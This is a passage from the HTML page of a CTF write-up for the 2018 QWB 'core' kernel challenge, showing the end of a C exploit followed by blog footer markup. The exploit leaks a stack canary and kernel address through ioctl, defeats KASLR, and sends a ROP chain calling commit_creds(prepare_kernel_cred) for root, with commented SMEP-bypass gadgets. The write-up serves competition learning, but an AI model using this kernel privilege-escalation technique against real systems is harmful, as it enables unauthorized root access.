class="built_in">puts</span>(<span class="string">&quot;&#123;==dbg==&#125; copy to user&quot;</span>);</span><br><span class="line">	ret = <span class="built_in">ioctl</span>(fd,<span class="number">0x6677889b</span>,(<span class="type">void</span> *)buf);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;&#123;==dbg==&#125; ret: %d\n&quot;</span>,ret);</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> canary = ((<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *)buf)[<span class="number">0</span>];</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> leak = ((<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *)buf)[<span class="number">7</span>];</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> offset = leak<span class="number">-0xffffffff8118ecfa</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;&#123;==dbg==&#125; canary: %p\n&quot;</span>,(<span class="type">void</span> *)canary);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;&#123;==dbg==&#125; leak offset: %p\n&quot;</span>,(<span class="type">void</span>*)offset);</span><br><span class="line"></span><br><span class="line">	prepare_kernel_cred+=offset;</span><br><span class="line">	commit_creds+=offset;</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span> rop_buf[<span class="number">0x1000</span>];</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> * rop = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *)rop_buf;</span><br><span class="line">	<span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line">	rop[i++] = <span class="number">0x6161616161616161</span>;</span><br><span class="line">	rop[i++] = <span class="number">0x6161616161616161</span>;</span><br><span class="line">	rop[i++] = <span class="number">0x6161616161616161</span>;</span><br><span class="line">	rop[i++] = <span class="number">0x6161616161616161</span>;</span><br><span class="line">	rop[i++] = <span class="number">0x6161616161616161</span>;</span><br><span class="line">	rop[i++] = <span class="number">0x6161616161616161</span>;</span><br><span class="line">	rop[i++] = <span class="number">0x6161616161616161</span>;</span><br><span class="line">	rop[i++] = <span class="number">0x6161616161616161</span>;</span><br><span class="line">	rop[i++] = canary;</span><br><span class="line">	rop[i++] = <span class="number">0</span>;<span class="comment">//rbx</span></span><br><span class="line">	<span class="comment">//ret</span></span><br><span class="line">	<span class="comment">//如果开了smep</span></span><br><span class="line">	<span class="comment">//rop[i++] = 0xffffffff81000b2f+offset;//pop rdi ; ret</span></span><br><span class="line">	<span class="comment">//rop[i++] = 0x6f0;</span></span><br><span class="line">	<span class="comment">//rop[i++] = 0xffffffff81075014+offset;//mov cr4, rdi ; push rdx ; popfq ; ret</span></span><br><span class="line">	rop[i++] = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)payload;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;&#123;==dbg==&#125; copy from user&quot;</span>);</span><br><span class="line">	<span class="built_in">write</span>(fd,rop_buf,<span class="number">0x800</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;&#123;==dbg==&#125; let rop&quot;</span>);</span><br><span class="line">	ret = <span class="built_in">ioctl</span>(fd,<span class="number">0x6677889a</span>,<span class="number">0xffffffffffff0000</span>|(<span class="number">0x100</span>));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;&#123;==dbg==&#125; ret: %d\n&quot;</span>,ret);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2018_06_05-%E5%BC%BA%E7%BD%91%E6%9D%AF2018_core_writeup/kernel_86baf0ecc0690bdc0857f463bbe51978.png"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="http://github.com/veritas501">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://veritas501.github.io/2018_06_05-%E5%BC%BA%E7%BD%91%E6%9D%AF2018_core_writeup/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://veritas501.github.io/2018_06_05-%E5%BC%BA%E7%BD%91%E6%9D%AF2018_core_writeup/&text=强网杯2018 core writeup"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://veritas501.github.io/2018_06_05-%E5%BC%BA%E7%BD%91%E6%9D%AF2018_core_writeup/&title=强网杯2018 core writeup"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://veritas501.github.io/2018_06_05-%E5%BC%BA%E7%BD%91%E6%9D%AF2018_core_writeup/&is_video=false&description=强网杯2018 core writeup"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=强网杯2018 core writeup&body=Check out this article: https://veritas501.github.io/2018_06_05-%E5%BC%BA%E7%BD%91%E6%9D%AF2018_core_writeup/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://veritas501.github.io/2018_06_05-%E5%BC%BA%E7%BD%91%E6%9D%AF2018_core_writeup/&title=强网杯2018 core writeup"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://veritas501.github.io/2018_06_05-%E5%BC%BA%E7%BD%91%E6%9D%AF2018_core_writeup/&title=强网杯2018 core writeup"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://veritas501.github.io/2018_06_05-%E5%BC%BA%E7%BD%91%E6%9D%AF2018_core_writeup/&title=强网杯2018 core writeup"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://veritas501.github.io/2018_06_05-%E5%BC%BA%E7%BD%91%E6%9D%AF2018_core_writeup/&title=强网杯2018 core writeup"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://veritas501.github.io/2018_06_05-%E5%BC%BA%E7%BD%91%E6%9D%AF2018_core_writeup/&name=强网杯2018 core writeup&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://veritas501.github.io/2018_06_05-%E5%BC%BA%E7%BD%91%E6%9D%AF2018_core_writeup/&t=强网杯2018 core writeup"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2023
+    veritas501
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/veritas501">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
